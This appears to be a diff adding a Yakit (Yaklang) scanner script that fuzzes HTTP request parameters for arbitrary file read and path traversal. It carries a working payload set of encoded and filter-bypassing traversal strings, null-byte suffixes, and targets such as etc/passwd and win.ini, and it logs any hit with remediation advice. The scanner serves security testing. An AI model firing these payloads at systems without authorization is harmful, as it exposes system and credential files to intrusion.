@@ -1,0 +1,292 @@
+__DESC__ = "检测任意文件读取/下载漏洞，支持 Linux/Windows/Java 等多种环境及绕过技术"
+__VERBOSE_NAME__ = "任意文件读取/下载检测"
+__KEYWORDS__ = "file-read,lfi,arbitrary-file-download,path-traversal,directory-traversal"
+
+// 配置项
+debug = false
+threads = 10
+
+// -------------------------------------------------------------------
+// CLI 参数定义
+// -------------------------------------------------------------------
+flowIDStr = cli.String(
+    "httpflow-id", 
+    cli.setVerboseName("HTTPFlowID"), 
+    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"), 
+    cli.setRequired(true), 
+)
+cli.check()
+
+// 辅助输出函数
+aiOut = msg => { 
+    try {
+        yakit.AIOutput(msg) 
+    } catch {
+        println(msg)
+    }
+}
+
+// -------------------------------------------------------------------
+// 核心数据结构
+// -------------------------------------------------------------------
+
+// 目标文件定义
+targets = [
+    // Linux
+    {"file": "etc/passwd", "os": "linux", "regex": `root:.*:0:0:`},
+    {"file": "etc/hosts", "os": "linux", "regex": `127\.0\.0\.1.*localhost`},
+    
+    // Windows
+    {"file": "windows/win.ini", "os": "windows", "regex": `\[extensions\]|\[fonts\]|\[files\]`},
+    {"file": "win.ini", "os": "windows", "regex": `\[extensions\]|\[fonts\]|\[files\]`},
+    {"file": "boot.ini", "os": "windows", "regex": `\[boot loader\]`},
+
+    // Java
+    {"file": "WEB-INF/web.xml", "os": "java", "regex": `<web-app`},
+]
+
+// 遍历前缀模式
+traversals = [
+    // 基础遍历 (深度优先)
+    "../../../../../../../../", // 8层，足够深
+    "../../../../", 
+    "../",
+    
+    // URL 编码
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f", // ../../../../ (全编码)
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/",         // ..%2f..%2f (部分编码 - 点号)
+    "..%2f..%2f..%2f..%2f",                 // ..%2f (部分编码 - 斜杠)
+    
+    // 双重编码
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252f", // 全双重
+    
+    // Unicode/UTF-8 超长编码 (GlassFish 等)
+    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/",
+    
+    // 双写绕过 (针对 str_replace('../', '') 过滤)
+    "....//....//....//....//",
+    "..././..././..././..././",
+
+    // 混合斜杠与反斜杠
+    "..\\/..\\/..\\/..\\/",
+    
+    // 绝对路径 (Linux)
+    "/",
+    // 绝对路径 (Windows)
+    "", 
+]
+
+// 后缀绕过模式
+suffixes = [
+    "",             // 无后缀
+    "%00",          // 空字节截断 (PHP < 5.3.4)
+    "%00.jpg",      // 图片后缀截断
+    "%00.html",
+]
+
+// -------------------------------------------------------------------
+// 核心逻辑: Fuzz 与 检测
+// -------------------------------------------------------------------
+
+// 检查响应内容是否匹配指纹
+checkFingerprint = func(body, regexStr) {
+    if body == nil || len(body) == 0 { return false }
+    return str.MatchAnyOfRegexp(string(body), regexStr)
+}
+
+// 全局 OS 状态 (空: 未知, "linux", "windows", "java")
+// 注意：Java 是跨平台的，所以通常不互斥，但 Linux 与 Windows 是互斥的
+detectedOS = ""
+
+// 互斥检查: 检查 payloadOS 是否与 currentDetectedOS 冲突
+// 返回 true 表示冲突，应该跳过
+isOSConflict = func(payloadOS, currentDetectedOS) {
+    if currentDetectedOS == "" { return false }
+    if payloadOS == "java" { return false } // Java 在任何系统都可能存在
+    if payloadOS == currentDetectedOS { return false }
+    
+    // 互斥逻辑
+    if (currentDetectedOS == "linux" && payloadOS == "windows") { return true }
+    if (currentDetectedOS == "windows" && payloadOS == "linux") { return true }
+    
+    return false
+}
+
+// ... (原有 checkFingerprint 函数保持不变) ...
+
+// 生成 Payloads
+generatePayloads = func() {
+    payloads = []
+    
+    for _, target = range targets {
+        // ... (原有生成逻辑) ...
+        targetFile = target.file
+        targetRegex = target.regex
+        targetOS = target.os
+
+        for _, traversal = range traversals {
+            currentPath = ""
+            if traversal == "" && targetOS == "windows" {
+                currentPath = "c:/" + targetFile
+                // 也要尝试 c:\
+                payloads = append(payloads, {"value": "c:\\" + str.ReplaceAll(targetFile, "/", "\\"), "regex": targetRegex, "desc": "Windows Absolute Path", "os": targetOS})
+            } else if traversal == "/" && targetOS == "windows" {
+                 continue 
+            } else {
+                 if targetOS == "windows" {
+                     winTraversal = str.ReplaceAll(traversal, "/", "\\")
+                     winFile = str.ReplaceAll(targetFile, "/", "\\")
+                     currentPath = winTraversal + winFile
+                 } else {
+                     currentPath = traversal + targetFile
+                 }
+            }
+
+            if currentPath != "" {
+                 for _, suffix = range suffixes {
+                     finalPayload = currentPath + suffix
+                     // 将 OS 信息加入 Payload 结构
+                     payloads = append(payloads, {"value": finalPayload, "regex": targetRegex, "desc": sprintf("%s %s", targetOS, targetFile), "os": targetOS})
+                 }
+            }
+        }
+    }
+    return payloads
+}
+
+// 执行探测
+fuzzTask = func(threads, url, param) {
+    aiOut(sprintf("正在检测参数: %s", param.Name()))
+    
+    payloads = generatePayloads()
+    
+    swg = sync.NewSizedWaitGroup(threads)
+    foundVuln = false 
+    
+    for _, p = range payloads {
+        if foundVuln { break }
+        
+        // --- 核心优化: OS 剪枝 ---
+        // 每次循环都检查一下全局 detectedOS
+        // 虽然多线程下有竞态，但只要 detectedOS 被赋值，后续的大部分请求就能被跳过，达到优化目的
+        if isOSConflict(p.os, detectedOS) {
+            continue 
+        }
+        
+        payload = p.value
+        regex = p.regex
+        desc = p.desc
+        payloadOS = p.os
+        
+        swg.Add()
+        go func {
+            defer swg.Done()
+            if foundVuln { return }
+            
+            // 二次检查 (因为在等待队列中时可能 detectedOS 已经变了)
+            if isOSConflict(payloadOS, detectedOS) { return }
+
+            // 发送请求
+            freq = param.Fuzz(payload)
+            res, err = freq.ExecFirst()
+            
+            if err != nil { return }
+            if res == nil { return }
+            
+            body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
+            if err != nil { return }
+            
+            if checkFingerprint(body, regex) {
+                if !foundVuln {
+                    foundVuln = true 
+                    
+                    // --- 锁定 OS ---
+                    if detectedOS == "" && payloadOS != "java" {
+                        detectedOS = payloadOS
+                        aiOut(sprintf(">>> OS Fingerprint Detected: %s", detectedOS))
+                    }
+                    
+                    msg = sprintf("Found Arbitrary File Read: %s", payload)
+                    aiOut(sprintf("✓ %s (Pattern: %s)", msg, desc))
+                    
+                    risk.NewRisk(
+                        url,
+                        risk.title(sprintf("Arbitrary File Read: %s", url)),
+                        risk.titleVerbose(sprintf("任意文件读取漏洞: %s", url)),
+                        risk.details({"payload": payload, "param": param.Name(), "file_pattern": desc, "detected_os": detectedOS}),
+                        risk.type("file-read"),
+                        risk.severity("high"),
+                        risk.payload(payload),
+                        risk.request(res.RequestRaw),
+                        risk.response(res.ResponseRaw),
+                        risk.description(sprintf("通过参数 %s 成功读取了系统敏感文件。Payload: %s (OS: %s)", param.Name(), payload, payloadOS)),
+                        risk.solution("1. 严格过滤 ../ 等路径遍历字符。\n2. 使用 ID 索引代替文件名。\n3. 限定文件访问白名单目录。")
+                    )
+                }
+            }
+        }
+    }
+    swg.Wait()
+}
+
+
+// -------------------------------------------------------------------
+// 主程序入口
+// -------------------------------------------------------------------
+
+flowID = parseInt(flowIDStr)
+flowsChan := db.QueryHTTPFlowsByID(flowID)
+flow = nil
+for f := range flowsChan {
+    flow = f
+    break
+}
+
+if flow == nil {
+    aiOut(sprintf("HTTPFlow 查询失败: 未找到 ID 为 %v 的请求", flowID))
+    return
+}
+
+reqBytes = flow.GetRequest()
+if reqBytes == nil { reqBytes = []byte(flow.Request) }
+if reqBytes == nil || len(reqBytes) == 0 {
+    aiOut("请求包为空,无法检测")
+    return
+}
+
+isHttps = flow.IsHTTPS
+freq, err := fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
+if err != nil {
+    aiOut(sprintf("解析请求失败: %v", err))
+    return
+}
+
+aiOut(sprintf("开始任意文件读取漏洞检测 (Target: %s)...", flow.Url))
+
+allParams = freq.GetCommonParams()
+validParams = []
+ignoredParams = ["PHPSESSID", "JSESSIONID", "_ga", "_gid", "submit", "Submit"]
+
+for param in allParams {
+    ignore = false
+    for _, i = range ignoredParams {
+        if str.MatchAllOfRegexp(param.Name(), sprintf("(?i)%s", i)) {
+            ignore = true
+            break
+        }
+    }
+    if !ignore {
+        validParams = append(validParams, param)
+    }
+}
+
+if len(validParams) == 0 {
+    aiOut("未发现可测试的有效参数")
+    return
+}
+
+for param in validParams {
+    fuzzTask(threads, flow.Url, param)
+}
+
+aiOut("=== 任意文件读取检测完成 ===")
